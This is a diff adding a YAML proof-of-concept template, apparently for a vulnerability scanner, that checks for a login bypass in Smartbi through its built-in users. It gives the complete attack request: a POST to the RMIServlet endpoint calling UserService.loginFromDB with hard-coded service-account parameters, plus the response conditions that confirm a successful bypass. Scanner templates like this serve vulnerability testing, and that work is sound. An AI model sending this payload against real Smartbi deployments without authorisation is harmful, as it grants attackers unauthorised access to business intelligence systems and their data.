@@ -1,0 +1,17 @@
+id: poc-yaml-Smartbi-neizhi-user-bypass-Login
+info:
+  name: Smartbi内置用户登陆绕过漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 认证绕过
+  finger: java
+requests:
+- method: POST
+  path: /smartbi/vision/RMIServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: className=UserService&methodName=loginFromDB&params=["service","0a"]
+  expression: status_code == 200  && contains(body,"\"result\":true") && contains(body,"\"retCode\":0")
+variables: {}
+transport: http
